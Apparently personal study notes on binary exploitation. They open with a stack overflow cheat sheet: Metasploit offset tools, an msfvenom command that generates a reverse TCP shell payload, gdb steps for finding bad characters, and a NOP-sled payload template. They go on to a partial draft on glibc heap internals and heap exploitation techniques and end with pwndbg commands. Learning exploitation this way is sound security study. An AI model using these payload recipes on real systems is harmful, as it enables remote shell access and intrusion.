```bash
# Offset
$ /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l $SIZE > pattern.txt
$ /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q $ADDRESS

# Shellcode
msfvenom -p linux/x86/shell_reverse_tcp lhost=<LHOST> lport=<LPORT> --format c --arch x86 --platform linux --bad-chars "<chars>" --out <filename>

# Identifying bad characters (step by step - iterative process)
(gdb) run $(python -c 'print "\x90" * (offset_len - 256) + "\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff" + "\x66" * 4')

(gdb) x/2000xb $esp+500

# proc info
(gdb) i proc all

# Find a return address
(gdb) x/2000xb $esp+1400

# Final
(gdb) run $(python -c 'print "\x55" * (offset_len - NOP_len - shellcode_len) + "\x90" * NOP_len + "shellcode" + "return address in little endian"')
```

`for i in $(cat len.txt); do ./bin $(python -c "print('A' * $i)"); done`

___

**Data Execution Prevention** (`DEP`) is a security feature available in Windows XP, and later with Service Pack 2 (SP2) and above, programs are monitored during execution to ensure that they access memory areas cleanly. DEP terminates the program if a program attempts to call or access the program code in an unauthorized manner.

___

## Heap exploitation draft

First documented heap exploit around the 2000s:

- <http://phrack.org/issues/66/6.html>

### Intro

#### GLIBC

**GLIBC**, often shortened to **libc**, stands for Gnu C Library (open source)
    + shared object _(linux equivalent to Windows **DLL** ?)_

> Alternative C library implementations exist such as `musl` or `uclibc`

On an average Linux distro, it is impossible to find a process that doesn't map a GLIBC shared object into memory, doesn't it?

Command | Description                                                          |
--------|----------------------------------------------------------------------|
`ldd`   | list dynamic dependencies (shared objects) that a binary relies upon |

`*.so` &rarr; shared objects

> ABI versioning convention = **soname**. Increment over the years

Generally, linux operating systems are distributed with a specific version of GLIBC, which will not change for the support period.

**Tip**: we can run libc.so to figure out which version is used and what version of `gcc` it was compiled with:

```console
amirr0r@os:~/notes$ /lib/x86_64-linux-gnu/libc.so.6 
GNU C Library (Ubuntu GLIBC 2.32-0ubuntu3) release release version 2.32.
Copyright (C) 2020 Free Software Foundation, Inc.
This is free software; see the source for copying conditions.
There is NO warranty; not even for MERCHANTABILITY or FITNESS FOR A
PARTICULAR PURPOSE.
Compiled by GNU CC version 10.2.0.
libc ABIs: UNIQUE IFUNC ABSOLUTE
For bug reporting instructions, please see:
<https://bugs.launchpad.net/ubuntu/+source/glibc/+bugs>.
```

#### `malloc()`

`malloc()` is a dynamic memory allocator function included in the **GLIBC**.

He distributes "**chunks**" of the heap (pieces from memory).

> `C++` **wrappers**: `new()`, `delete()`, `make_shared()`, `make_unique()`.

Basic operations like starting a new thread, opening a file, dealing with I/O rely on `malloc()` under the hood.

Unlike programming langages such as `Rust`, memory corruption is still an issue for `C`/`C++`... 

> This type of vulnerability can lead to info leak, denial of service or even arbitrary code execution. 

```c
void *ptr = malloc(wanted_size_of_allocated_memory)
```

- It uses an inline metadata (or header) to indicates the size of the next allocated chunk (total of bytes) plus a flag that tell if the following chunk is allocated or not (`+ 0x1` &rarr; least significant bit).

> This flag is called **prev_inuse**

`free(ptr)` is used to recycle the heap. 

[**LiveOverflow**: what does `malloc()` do?](https://www.youtube.com/watch?v=HPDBOhiKaD8&list=PLhixgUqwRTjxglIswKp9mpkfPNfHkzyeN&index=26)

### The Heap

- **Minimum size chunk**: 3 quadwords at 24 bytes _(even if we ask less)_.

- A **Top chunk** resides at the highest address of the heap. When a new chunk is allocated, this top chunk is reduced. 

> As the other chunks, it has a size field.

- <https://sourceware.org/glibc/wiki/MallocInternals>
___

### Exploitation techniques

#### House of Force

In many versions of **GLIBC**, top chunk size field are not subject to integrity checks. This forms the basis of the House of Force...

#### House of Orange
#### House of Spirit
#### House of Lore
#### House of Einherjar
#### House of Rabbit
#### Poison Null Byte
#### House of Corrosion
#### Fastbin Dup
#### Unsafe Unlink
#### Safe Unlink
#### Unsortedbin Attack
#### Tcache Dup

___

## `pwndbg`:

- `set context-sections <regs, disasm, args, code, stack, backtrace, expressions, ghidra>`: change the context displayed at each iteration (default: `registers, disasm, code, stack and backtrace`)
- `context`: print the context
- `vmmap`: prints memory map for current process
- `vis_heap_chunks`: inspect heap memory